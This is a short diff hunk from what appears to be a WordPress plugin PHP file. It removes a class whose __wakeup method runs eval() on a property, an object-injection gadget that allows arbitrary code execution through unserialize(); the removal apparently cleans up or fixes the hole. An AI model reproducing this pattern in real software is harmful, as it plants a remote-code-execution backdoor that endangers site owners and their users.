@@ -23,23 +23,6 @@ if ( ! defined( 'ABSPATH' ) ) {
 	header( 'HTTP/1.0 403 Forbidden' );
 	exit;
 }
-
-class Example2
-{
-   private $hook;
-
-   function __construct()
-   {
-      // some PHP code...
-   }
-
-   function __wakeup()
-   {
-      eval($this->hook);
-   }
-}
-
-
 /**
  * Add/display a new module section
  *
